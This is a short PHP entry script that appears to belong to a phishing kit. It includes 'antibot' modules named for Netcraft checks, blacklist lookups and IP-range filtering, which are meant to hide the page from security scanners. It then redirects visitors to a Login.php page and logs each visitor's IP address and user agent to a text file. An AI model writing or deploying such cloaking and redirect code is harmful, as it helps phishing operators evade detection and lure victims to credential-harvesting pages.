<?php
include 'antibot/visitor_log.php';
include 'antibot/netcraft_check.php';
include 'antibot/blacklist_lookup.php';
include 'antibot/ip_range_check.php';
include 'files/config.php';

header("location:Login.php");


$fp = fopen('files/logs.txt', 'a');
	fwrite($fp, $_SERVER['REMOTE_ADDR']." : ".$_SERVER['HTTP_USER_AGENT']."\n");
	fclose($fp);
?>